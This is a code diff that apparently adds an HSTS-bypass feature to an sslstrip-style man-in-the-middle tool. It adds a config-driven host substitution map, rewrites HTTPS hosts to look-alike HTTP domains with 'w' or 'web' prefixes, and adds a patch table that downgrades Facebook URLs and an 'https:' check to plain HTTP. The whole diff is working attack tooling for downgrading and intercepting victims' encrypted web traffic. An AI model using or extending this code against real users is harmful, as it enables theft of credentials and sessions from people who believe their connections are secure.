@@ -17,6 +17,8 @@
 #
 
 import re, os
+import logging
+from configobj import ConfigObj
 
 class URLMonitor:    
 
@@ -28,12 +30,26 @@ class URLMonitor:
     # Start the arms race, and end up here...
     javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
     _instance          = None
+    sustitucion        = {} # LEO: diccionario host / sustitucion
+    real           = {} # LEO: diccionario host / real
+    patchDict      = {
+            'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
+            'https:\/\/www.facebook.com':'http:\/\/social.facebook.com',
+            'return"https:"':'return"http:"'
+            }
 
     def __init__(self):
         self.strippedURLs       = set()
         self.strippedURLPorts   = {}
         self.redirects          = []
         self.faviconReplacement = False
+        self.hsts               = False
+
+        hsts_config = ConfigObj("./config/hsts_bypass.cfg")
+
+        for k,v in hsts_config.items():
+            self.sustitucion[k] = v
+            self.real[v] = k
 
     def isSecureLink(self, client, url):
         for expression in URLMonitor.javascriptTrickery:
@@ -85,7 +101,7 @@ class URLMonitor:
         method      = url[0:methodIndex]
 
         pathIndex   = url.find("/", methodIndex)
-        host        = url[methodIndex:pathIndex]
+        host        = url[methodIndex:pathIndex].lower()
         path        = url[pathIndex:]
 
         port        = 443
@@ -96,14 +112,35 @@ class URLMonitor:
             port = host[portIndex+1:]
             if len(port) == 0:
                 port = 443
-        
-        url = method + host + path
 
-        self.strippedURLs.add((client, url))
-        self.strippedURLPorts[(client, url)] = int(port)
+        if self.hsts:
+            #LEO: Sustituir HOST
+            if not self.sustitucion.has_key(host):
+                lhost = host[:4]
+                if lhost=="www.":
+                    self.sustitucion[host] = "w"+host
+                    self.real["w"+host] = host
+                else:
+                    self.sustitucion[host] = "web"+host
+                    self.real["web"+host] = host
+                logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
+                    
+            url = 'http://' + host + path
+            #logging.debug("LEO stripped URL: %s %s"%(client, url))
 
-    def setValues(self, faviconSpoofing, clientLogging):
+            self.strippedURLs.add((client, url))
+            self.strippedURLPorts[(client, url)] = int(port)
+            return 'http://'+self.sustitucion[host]+path
+
+        else:
+            url = method + host + path
+
+            self.strippedURLs.add((client, url))
+            self.strippedURLPorts[(client, url)] = int(port)
+
+    def setValues(self, faviconSpoofing, hstsbypass=False, clientLogging=False,):
         self.faviconSpoofing = faviconSpoofing
+        self.hsts = hstsbypass
         self.clientLogging = clientLogging
 
     def isFaviconSpoofing(self):
@@ -112,8 +149,20 @@ class URLMonitor:
     def isClientLogging(self):
         return self.clientLogging
 
+    def isHstsBypass(self):
+        return self.hsts
+
     def isSecureFavicon(self, client, url):
         return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
+    
+    def URLgetRealHost(self,host):
+        logging.debug("Parsing host: %s"%host)
+        if self.real.has_key(host):
+            logging.debug("New host: %s"%self.real[host])
+            return self.real[host]
+        else:
+            logging.debug("New host: %s"%host)
+            return host
 
     def getInstance():
         if URLMonitor._instance == None:
